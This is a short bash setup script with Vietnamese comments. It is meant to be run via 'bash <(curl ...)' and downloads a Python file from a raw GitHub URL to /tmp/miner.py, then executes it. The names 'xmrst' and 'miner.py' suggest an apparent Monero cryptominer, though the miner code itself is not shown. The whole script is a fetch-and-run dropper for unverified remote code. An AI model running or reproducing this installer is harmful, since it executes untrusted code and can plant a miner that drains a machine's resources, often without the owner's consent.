# bash <(curl -sSL https://github.com/DucManh206/xmrst/blob/main/setup.sh)


#!/bin/bash

# Tải script Python từ URL
echo "🚀 Đang tải script Python..."
curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/min.py -o /tmp/miner.py

# Kiểm tra xem script đã tải về thành công không
if [ ! -f "/tmp/miner.py" ]; then
  echo "❌ Lỗi tải tệp script Python."
  exit 1
fi

# Chạy script Python
echo "🛠️ Đang chạy script Python..."
python3 /tmp/miner.py
